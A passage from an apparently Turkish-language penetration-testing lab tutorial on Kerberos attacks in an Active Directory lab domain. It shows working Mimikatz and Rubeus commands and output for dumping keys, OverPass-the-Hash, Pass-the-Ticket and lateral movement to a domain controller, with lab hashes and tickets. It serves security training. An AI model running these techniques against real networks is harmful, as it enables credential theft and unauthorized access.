Ec5N7xBkymYLHAbM9DnDpJ963RN/0FcZDusDdorHA1DxNUCHQgvK17iametKsz6Vgw0zVySsPp/wZ/tssglp5UU6in1Bq91hA2c35l8M1oGkCqiQrfY8x3GNpMPixwBdd2OU1xwn/gaon2fpWEPFzKgDRtKe1FfTjoEySGr38QSs1+JkVk0HTRUbx9Nnq6w3W+D1p+FSCRZyCF/H1ahT9o0IRkFiOj0Cud5wyyEDom08wOmgwxK0D/0aisBTRzmZrSfG7Kjm9/yNmLB5va1yD3IyFiMreZZ2WRpNyK0G6L4H7NBZPcxIgE/Cxx/KduYTPnBDvwb6uUDMcZR83lVAQ5NyHHaHUOjoWsawHraI4uYgmCqXYN7yYmJPKNDI290GMbn1zIPSSL82V3hRbOO8CZNP/f64haRlR63GJBGaOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oCswKaADAgESoSIEIClgTKTOAY3p4054sB9McPBYb2xUn/kgVWSSXFoFCot8oQkbB0hUQi5DT02iEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDIyMDcxMjEzMzk1NFqmERgPMjAyMjA3MTIyMzM5NTRapxEYDzIwMjIwNzE5MTMzOTU0WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdIVEIuQ09N

  UserName                 : plaintext
  Domain                   : HTB
  LogonId                  : 0x6c680
  UserSID                  : S-1-5-21-228825152-3134732153-3833540767-1107
  AuthenticationPackage    : Kerberos
  LogonType                : Interactive
  LogonTime                : 7/12/2022 9:42:15 AM
  LogonServer              : DC01
  LogonServerDNSDomain     : inlanefreight.htb
  UserPrincipalName        : plaintext@inlanefreight.htb


    ServiceName           :  krbtgt/inlanefreight.htb
    ServiceRealm          :  inlanefreight.htb
    UserName              :  plaintext
    UserRealm             :  inlanefreight.htb
    StartTime             :  7/12/2022 9:42:15 AM
    EndTime               :  7/12/2022 7:42:15 PM
    RenewTill             :  7/19/2022 9:42:15 AM
    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  2NN3wdC4FfpQunUUgK+MZO8f20xtXF0dbmIagWP0Uu0=
    Base64EncodedTicket   :

doIE9jCCBPKgAwIBBaEDAgEWooIECTCCBAVhggQBMIID/aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB0hUQi5DT02jggPLMIIDx6ADAgESoQMCAQKiggO5BIIDtc6ptErl3sAxJsqVTkV84/IcqkpopGPYMWzPcXaZgPK9hL0579FGJEBXX+Ae90rOcpbrbErMr52WEVa/E2vVsf37546ScP0+9LLgwOAoLLkmXAUqP4zJw47nFjbZQ3PHs+vt6LI1UnGZoaUNcn1xI7VasrDoFakj/ZH+GZ7EjgpBQFDZy0acNL8cK0AIBIe8fBF5K7gDPQugXaB6diwoVzaO/E/p8m3t35CR1PqutI5SiPUNim0s/snipaQnyuAZzOqFmhwPPujdwOtm1jvrmKV1zKcEo2CrMb5xmdoVkSn4L6AlX328K0+OUILS5GOe2gX6Tv1zw1F9ANtEZF6FfUk9A6E0dc/OznzApNlRqnJ0dq45mD643HbewZTV8YKS/lUovZ6WsjsyOy6UGKj+qF8WsOK1YsO0rW4ebWJOnrtZoJXryXYDf+mZ43yKcS10etHsq1B2/XejadVr1ZY7HKoZKi3gOx3ghk8foGPfWE6kLmwWnT16COWVI69D9pnxjHVXKbB5BpQWAFUtEGNlj7zzWTPEtZMVGeTQOZ0FfWPRS+EgLmxUc47GSVON7jhOTx3KJDmE7WHGsYzkWtKFxKEWMNxIC03P7r9seEo5RjS/WLant4FCPI+0S/tasTp6GGP30lbZT31WQER49KmSC75jnfT/9lXMVPHsA3VGG2uwGXbq1H8UkiR0ltyD99zDVTmYZ1aP4y63F3Av9cg3dTnz60hNb7H+AFtfCjHGWdwpf9HZ0u0HlBHSA7pYADoJ9+ioDghL+cqzPn96VyDcqbauwX/FqC/udT+cgmkYFzSIzDhZv6EQmjUL4b2DFL/Mh8BfHnFCHLJdAVRdHlLEEl1MdK9/089O06kD3qlE6s4hewHwqDy39ORxAHHQBFPU211nhuU4Jofb97d7tYxn8f8c5WxZmk1nPILyAI8u9z0nbOVbdZdNtBg5sEX+IRYyY7o0z9hWJXpDPuk0ksDgDckPWtFvVqX6Cd05yP2OdbNEeWns9JV2D5zdS7Q8UMhVo7z4GlFhT/eOopfPc0bxLoOv7y4fvwhkFh/9LfKu6MLFneNff0Duzjv9DQOFd1oGEnA4MblzOcBscoH7CuscQQ8F5xUCf72BVY5mShq8S89FG9GtYotmEUe/j+Zk6QlGYVGcnNcDxIRRuyI1qJZxCLzKnL1xcKBF4RblLcUtkYDT+mZlCSvwWgpieq1VpQg42Cjhxz/+xVW4Vm7cBwpMc77Yd1+QFv0wBAq5BHvPJI4hCVPs7QejgdgwgdWgAwIBAKKBzQSByn2BxzCBxKCBwTCBvjCBu6ArMCmgAwIBEqEiBCDY03fB0LgV+lC6dRSAr4xk7x/bTG1cXR1uYhqBY/RS7aEJGwdIVEIuQ09NohYwFKADAgEBoQ0wCxsJcGxhaW50ZXh0owcDBQBA4QAApREYDzIwMjIwNzEyMTM0MjE1WqYRGA8yMDIyMDcxMjIzNDIxNVqnERgPMjAyMjA3MTkxMzQyMTVaqAkbB0hUQi5DT02pHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB0hUQi5DT00=

<SNIP>
```

**Not:** Tüm biletleri toplamak için Mimikatz veya Rubeus'u yönetici olarak çalıştırmamız gerekir.  

Bu, bir bilgisayardan biletleri almanın yaygın bir yoludur. Kerberos biletlerini kötüye kullanmanın bir başka avantajı da kendi biletlerimizi taklit etme yeteneğidir. `OverPass the Hash veya Pass the Key` tekniğini kullanarak bunu nasıl yapabileceğimizi görelim.


## Pass the Key or OverPass the Hash
Geleneksel `Pass the Hash (PtH)` tekniği, Kerberos'a dokunmayan bir NTLM parola hashinin yeniden kullanılmasını içerir. `Pass the Key` ya da `OverPass the Hash` yaklaşımı, domain'e katılmış bir kullanıcı için bir hash/anahtarı (rc4_hmac, aes256_cts_hmac_sha1, vb.) tam bir `Ticket-Granting-Ticket`'a `(TGT)` dönüştürür `.` Bu teknik Benjamin Delpy ve Skip Duckwall tarafından [Abusing Microsoft Kerberos - Sorry you don't get it](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18) adlı sunumlarında geliştirilmiştir [.](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18) Ayrıca [Will Schroeder](https://twitter.com/harmj0y), [Rubeus](https://github.com/GhostPack/Rubeus) aracını oluşturmak için onların projesini uyarlamıştır.


Ticket'larımızı taklit etmek için kullanıcının hash'ine ihtiyacımız var; `sekurlsa::ekeys` modülünü kullanarak tüm kullanıcıların Kerberos şifreleme key'lerini dump etmek için Mimikatz'ı kullanabiliriz. Bu modül Kerberos paketi için mevcut olan tüm anahtar tiplerini listeleyecektir.

#### **Mimikatz - Kerberos Anahtarlarını Çıkarın**
```cmd-session
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
<SNIP>

Authentication Id : 0 ; 444066 (00000000:0006c6a2)
Session           : Interactive from 1
User Name         : plaintext
Domain            : HTB
Logon Server      : DC01
Logon Time        : 7/12/2022 9:42:15 AM
SID               : S-1-5-21-228825152-3134732153-3833540767-1107

         * Username : plaintext
         * Domain   : inlanefreight.htb
         * Password : (null)
         * Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
<SNIP>
```

Artık `AES256_HMAC` ve `RC4_HMAC` anahtarlarına erişimimiz olduğuna göre `Mimikatz` ve `Rubeus` kullanarak OverPass the Hash veya Pass the Key saldırısını gerçekleştirebiliriz.


#### **Mimikatz - Pass the Key or OverPass the Hash**
```cmd-session
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

user    : plaintext
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 3f74aa8f08f712f09cd5177b5c1ce50f
  |  PID  1128
  |  TID  3268
  |  LSA Process is now R/W
  |  LUID 0 ; 3414364 (00000000:0034195c)
  \_ msv1_0   - data copy @ 000001C7DBC0B630 : OK !
  \_ kerberos - data copy @ 000001C7E20EE578
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001C7E2136BC8 (32) -> null
```

Bu, hedef kullanıcı bağlamında istediğimiz herhangi bir servise erişim talep etmek için kullanabileceğimiz yeni bir `cmd.exe` penceresi oluşturacaktır.  

`Rubeus` kullanarak bir ticket taklit etmek için `asktgt` modülünü kullanıcı adı, domain ve `/rc4`, `/aes128`, `/aes256`, veya `/des` olabilen hash ile kullanabiliriz. Aşağıdaki örnekte, Mimikatz `sekurlsa::ekeys` kullanarak topladığımız bilgilerden aes256 hashini kullanıyoruz.


#### Rubeus - Pass the Key or OverPass the Hash
```cmd-session
c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
[+] TGT request successful!
[*] base64(ticket.kirbi):

doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/LSsa2xrdJJir1eVugDFCoGFT2hDcYcpRdifXw67WofDM6Z6utsha+4bL0z6QN+tdpPlNQFwjuWmBrZtpS9TcCblotYvDHa0aLVsroW/fqXJ4KIV2tVfbVIDJvPkgdNAbhp6NvlbzeakR1oO5RTm7wtRXeTirfo6C9Ap0HnctlHAd+Qnvo2jGUPP6GHIhdlaM+QShdJtzBEeY/xIrORiiylYcBvOoir8mFEzNpQgYADmbTmg+c7/NgNO8Qj4AjrbGjVf/QWLlGc7sH9+tARi/Gn0cGKDK481A0zz+9C5huC9ZoNJ/18rWfJEb4P2kjlgDI0/fauT5xN+3NlmFVv0FSC8/909pUnovy1KkQaMgXkbFjlxeheoPrP6S/TrEQ8xKMyrz9jqs3ENh//q738lxSo8J2rZmv1QHy+wmUKif4DUwPyb4AHgSgCCUUppIFB3UeKjqB5srqHR78YeAWgY7pgqKpKkEomy922BtNprk2iLV1cM0trZGSk6XJ/H+JuLHI5DkuhkjZQbb1kpMA2CAFkEwdL9zkfrsrdIBpwtaki8pvcBPOzAjXzB7MWvhyAQevHCT9y6iDEEvV7fsF/B5xHXiw3Ur3P0xuCS4K/Nf4GC5PIahivW3jkDWn3g/0nl1K9YYX7cfgXQH9/inPS0OF1doslQfT0VUHTzx8vG3H25vtc2mPrfIwfUzmReLuZH8GCvt4p2BAbHLKx6j/HPa4+YPmV0GyCv9iICucSwdNXK53Q8tPjpjROha4AGjaK50yY8lgknRA4dYl7+O2+j4K/lBWZHy+IPgt3TO7YFoPJIEuHtARqigF5UzG1S+mefTmqpuHmoq72KtidINHqi+GvsvALbmSBQaRUXsJW/Lf17WXNXmjeeQWemTxlysFs1uRw9JlPYsGkXFh3fQ2ngax7JrKiO1/zDNf6cvRpuygQRHMOo5bnWgB2E7hVmXm2BTimE7axWcmopbIkEi165VOy/M+pagrzZDLTiLQOP/X8D6G35+srSr4YBWX4524/Nx7rPFCggxIXEU4zq3Ln1KMT9H7efDh+h0yNSXMVqBSCZLx6h3Fm2vNPRDdDrq7uz5UbgqFoR2tgvEOSpeBG5twl4MSh6VA7LwFi2usqqXzuPgqySjA1nPuvfy0Nd14GrJFWo6eDWoOy2ruhAYtaAtYC6OByDCBxaADAgEAooG9BIG6fYG3MIG0oIGxMIGuMIGroBswGaADAgEXoRIEENEzis1B3YAUCjJPPsZjlduhCRsHSFRCLkNPTaIWMBSgAwIBAaENMAsbCXBsYWludGV4dKMHAwUAQOEAAKURGA8yMDIyMDcxMjE1MjgyNlqmERgPMjAyMjA3MTMwMTI4MjZapxEYDzIwMjIwNzE5MTUyODI2WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdodGIuY29t

  ServiceName           :  krbtgt/inlanefreight.htb
  ServiceRealm          :  inlanefreight.htb
  UserName              :  plaintext
  UserRealm             :  inlanefreight.htb
  StartTime             :  7/12/2022 11:28:26 AM
  EndTime               :  7/12/2022 9:28:26 PM
  RenewTill             :  7/19/2022 11:28:26 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  0TOKzUHdgBQKMk8+xmOV2w==
```

**Not:** Mimikatz, Pass the Key/OverPass the Hash saldırılarını gerçekleştirmek için yönetici hakları gerektirirken Rubeus gerektirmez.

Mimikatz `sekurlsa::pth` ve Rubeus `asktgt` arasındaki fark hakkında daha fazla bilgi edinmek için Rubeus aracı belgelerine bakın [Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).

**Not:** Modern Windows domainleri (işlevsel seviye 2008 ve üzeri) normal Kerberos değişimlerinde varsayılan olarak AES şifrelemesini kullanır. Bir Kerberos değişiminde aes256_cts_hmac_sha1 (veya aes128) anahtarı yerine bir rc4_hmac (NTLM) hash'i kullanırsak, bu bir "şifreleme düşürme" olarak algılanabilir.


## **Pass the Ticket (PtT)**

Artık bazı Kerberos biletlerimiz olduğuna göre, bunları bir ortam içinde yanlamasına hareket etmek için kullanabiliriz.  

`Rubeus` ile bir OverPass the Hash saldırısı gerçekleştirdik ve bileti base64 formatında aldık. Bunun yerine, bileti (TGT veya TGS) mevcut oturum açma oturumuna göndermek için `/ptt` bayrağını kullanabiliriz.


#### Rubeus Pass the Ticket
```cmd-session
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKh
      EzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpcGX6rbUlYxOWeMmu/zb
      f7vGgDj/g+P5zzLbr+XTIPG0kI2WCOlAFCQqz84yQd6IRcEeGjG4YX/9ezJogYNtiLnY6YPkqlQaG1Nn
      pAQBZMIhs01EH62hJR7W5XN57Tm0OLF6OFPWAXncUNaM4/aeoAkLQHZurQlZFDtPrypkwNFQ0pI60NP2
      9H98JGtKKQ9PQWnMXY7Fc/5j1nXAMVj+Q5Uu5mKGTtqHnJcsjh6waE3Vnm77PMilL1OvH3Om1bXKNNan
      JNCgb4E9ms2XhO0XiOFv1h4P0MBEOmMJ9gHnsh4Yh1HyYkU+e0H7oywRqTcsIg1qadE+gIhTcR31M5mX
      5TkMCoPmyEIk2MpO8SwxdGYaye+lTZc55uW1Q8u8qrgHKZoKWk/M1DCvUR4v6dg114UEUhp7WwhbCEtg
      5jvfr4BJmcOhhKIUDxyYsT3k59RUzzx7PRmlpS0zNNxqHj33yAjm79ECEc+5k4bNZBpS2gJeITWfcQOp
      lQ08ZKfZw3R3TWxqca4eP9Xtqlqv9SK5kbbnuuWIPV2/QHi3deB2TFvQp9CSLuvkC+4oNVg3VVR4bQ1P
      fU0+SPvL80fP7ZbmJrMan1NzLqit2t7MPEImxum049nUbFNSH6D57RoPAaGvSHePEwbqIDTghCJMic2X
      c7YJeb7y7yTYofA4WXC2f1MfixEEBIqtk/drhqJAVXz/WY9r/sWWj6dw9eEhmj/tVpPG2o1WBuRFV72K
      Qp3QMwJjPEKVYVK9f+uahPXQJSQ7uvTgfj3N5m48YBDuZEJUJ52vQgEctNrDEUP6wlCU5M0DLAnHrVl4
      Qy0qURQa4nmr1aPlKX8rFd/3axl83HTPqxg/b2CW2YSgEUQUe4SqqQgRlQ0PDImWUB4RHt+cH6D563n4
      PN+yqN20T9YwQMTEIWi7mT3kq8JdCG2qtHp/j2XNuqKyf7FjUs5z4GoIS6mp/3U/kdjVHonq5TqyAWxU
      wzVSa4hlVgbMq5dElbikynyR8maYftQk+AS/xYby0UeQweffDOnCixJ9p7fbPu0Sh2QWbaOYvaeKiG+A
      GhUAUi5WiQMDSf8EG8vgU2gXggt2Slr948fy7vhROp/CQVFLHwl5/kGjRHRdVj4E+Zwwxl/3IQAU0+ag
      GrHDlWUe3G66NrR/Jg8zXhiWEiViMd5qPC2JTW1ronEPHZFevsU0pVK+MDLYc3zKdfn0q0a3ys9DLoYJ
      8zNLBL3xqHY9lNe6YiiAzPG+Q6OByDCBxaADAgEAooG9BIG6fYG3MIG0oIGxMIGuMIGroBswGaADAgEX
      oRIEED0RtMDJnODs5w89WCAI3bChCRsHSFRCLkNPTaIWMBSgAwIBAaENMAsbCXBsYWludGV4dKMHAwUA
      QOEAAKURGA8yMDIyMDcxMjE2Mjc0N1qmERgPMjAyMjA3MTMwMjI3NDdapxEYDzIwMjIwNzE5MTYyNzQ3
      WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdodGIuY29t
[+] Ticket successfully imported!

  ServiceName           :  krbtgt/inlanefreight.htb
  ServiceRealm          :  inlanefreight.htb
  UserName              :  plaintext
  UserRealm             :  inlanefreight.htb
  StartTime             :  7/12/2022 12:27:47 PM
  EndTime               :  7/12/2022 10:27:47 PM
  RenewTill             :  7/19/2022 12:27:47 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  PRG0wMmc4OznDz1YIAjdsA==
```

Şimdi `Ticket successfully imported! (Bilet başarıyla içe aktarıldı`) görüntülendiğine dikkat edin.  

Başka bir yol da bileti diskten `.kirbi` dosyasını kullanarak mevcut oturuma aktarmaktır.  

Mimikatz'dan dışa aktarılan bir bileti kullanalım ve Pass the Ticket kullanarak içe aktaralım.


#### Rubeus - Pass the Ticket
```cmd-session
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

 ______        _
(_____ \      | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.5.0


[*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

Pass the Ticket saldırısını gerçekleştirmek için Rubeus'tan gelen base64 çıktısını da kullanabilir veya bir .kirbi'yi base64'e dönüştürebiliriz. Bir .kirbi'yi base64'e dönüştürmek için PowerShell'i kullanabiliriz.


#### **.kirbi 'yi Base64 Formatına Dönüştür**

```powershell-session
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQzYYQAAAQtMIQAAAQnoIQAAAADAgEFoYQAAAAJGwdIVEIuQ09NooQAAAAsMIQAAAAmoIQAAAADAgECoYQAAAAXMIQAAAARGwZrcmJ0Z3QbB0hUQi5DT02jhAAAA9cwhAAAA9GghAAAAAMCARKhhAAAAAMCAQKihAAAA7kEggO1zqm0SuXewDEmypVORXzj8hyqSmikY9gxbM9xdpmA8r2EvTnv0UYkQFdf4B73Ss5ylutsSsyvnZYRVr8Ta9Wx/fvnjpJw/T70suDA4CgsuSZcBSo/jMnDjucWNtlDc8ez6<SNIP>
```

Rubeus kullanarak, dosya adı yerine base64 stringini sağlayan bir Pass the Ticket gerçekleştirebiliriz.

#### Pass the Ticket - Base64 Format

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
 ______        _
(_____ \      | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.5.0


[*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)
```

Son olarak, Mimikatz modülü `kerberos::ptt` ve almak istediğimiz bileti içeren .kirbi dosyasını kullanarak Pass the Ticket saldırısını da gerçekleştirebiliriz.


#### Mimikatz - Pass the Ticket
```cmd-session
C:\tools> mimikatz.exe 

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK
mimikatz # exit
Bye!
c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

**Not:** mimikatz.exe'yi cmd.exe ile açıp bileti geçerli komut istemine almak için çıkmak yerine, `misc::cmd` komutunu kullanarak içe aktarılan biletle yeni bir komut istemi penceresi başlatmak için Mimikatz modülü `misc` 'i kullanabiliriz.


## **PowerShell Remoting ile Pass The Ticket**

**(Windows)**  

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), uzaktaki bir bilgisayarda komut dosyaları veya komutlar çalıştırmamızı sağlar. Yöneticiler genellikle ağdaki uzak bilgisayarları yönetmek için PowerShell Remoting'i kullanır. PowerShell Remoting'i etkinleştirmek hem HTTP hem de HTTPS dinleyicileri oluşturur. Dinleyici, HTTP için TCP/5985 ve HTTPS için TCP/5986 standart portlarında çalışır.  

Uzak bir bilgisayarda PowerShell Remoting oturumu oluşturmak için yönetici izinlerine sahip olmanız, Remote Management Users grubunun bir üyesi olmanız veya oturum yapılandırmanızda açık PowerShell Remoting izinlerine sahip olmanız gerekir.  

Uzak bir bilgisayarda yönetici ayrıcalıklarına sahip olmayan ancak Remote Management Users grubunun üyesi olan bir kullanıcı hesabı bulduğumuzu varsayalım. Bu durumda, o bilgisayara bağlanmak ve komutları çalıştırmak için PowerShell Remoting'i kullanabiliriz.


## **Mimikatz - Pass the Ticket ile PowerShell Remoting**  

Pass the Ticket ile PowerShell Remoting kullanmak için, biletimizi içe aktarmak için Mimikatz'ı kullanabilir ve ardından bir PowerShell konsolu açıp hedef makineye bağlanabiliriz. Yeni bir `cmd.exe` açalım ve mimikatz.exe'yi çalıştıralım, ardından `kerberos::ptt` kullanarak topladığımız bileti içe aktaralım. Bilet cmd.exe oturumumuza aktarıldıktan sonra, aynı cmd.exe'den bir PowerShell komut istemi başlatabilir ve hedef makineye bağlanmak için `Enter-PSSession` komutunu kullanabiliriz.


#### Mimikatz - Pass the Ticket for Lateral Movement.
```cmd-session
C:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

mimikatz # exit
Bye!

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
[DC01]: PS C:\Users\john\Documents>
```


## Rubeus - PowerShell Remoting with Pass the Ticket

Rubeus, kurban bir proses/logon oturumu ([Logon type 9](“https://eventlogxp.com/blog/logon-type-what-does-it-mean/”)) oluşturan `createnetonly` seçeneğine sahiptir. Proses varsayılan olarak gizlidir, ancak prosesi görüntülemek için `/show` bayrağını belirtebiliriz ve sonuç `runas /netonly` ile eşdeğerdir. Bu, mevcut oturum açma oturumu için mevcut TGT'lerin silinmesini önler.

#### **Rubeus ile Kurban Prosesi Oluşturun**
```cmd-session
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3


[*] Action: Create process (/netonly)


[*] Using random username and password.

[*] Showing process : True
[*] Username        : JMI8CL7C
[*] Domain          : DTCDV6VL
[*] Password        : MRWI6XGI
[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1556
[+] LUID            : 0xe07648
```

Yukarıdaki komut yeni bir cmd penceresi açacaktır. Bu pencereden, bileti mevcut oturumumuza aktarmak ve PowerShell Remoting kullanarak DC'ye bağlanmak için `/ptt` seçeneğiyle yeni bir TGT istemek üzere Rubeus'u çalıştırabiliriz.

#### Rubeus - Pass the Ticket for Lateral Movement
```cmd-session
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
   ______        _
  (_____ \      | |
